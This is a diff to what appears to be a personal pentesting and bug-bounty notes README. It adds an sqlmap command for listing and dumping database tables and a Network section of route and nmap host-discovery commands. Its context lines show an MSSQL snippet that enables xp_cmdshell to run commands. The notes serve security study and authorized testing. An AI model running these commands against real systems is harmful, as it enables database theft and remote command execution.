@@ -15,6 +15,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [CSP](#csp)
 - [XSS](#xss)
 - [SQLi](#sqli)
+- [Network](#network)
 - [Linux](#linux)
 
 ### To Read list
@@ -114,6 +115,12 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 
 ### SQLi
 
+```
+ > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
+                  --tables (to see db)
+                  -D DATABASE_NAME -T TABLE_NAME --dump (to see data)
+```
+
 **RCE**
 ```sql
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
@@ -134,6 +141,14 @@ RECONFIGURE
 GO
 xp_cmdshell 'COMMAND';
 ```
+
+### Network
+```
+ip route add <net_address_in_cdr> via <interface_gateway>
+route add <net_address_in_cdr> mask <net_address_mask_in_cdr> <interface_gateway> (Windows)
+nmap -sn <net_address_in_cdr> | Check hosts alive, adding -A you gather more info for a target
+```
+ 
 
 ### Linux
 
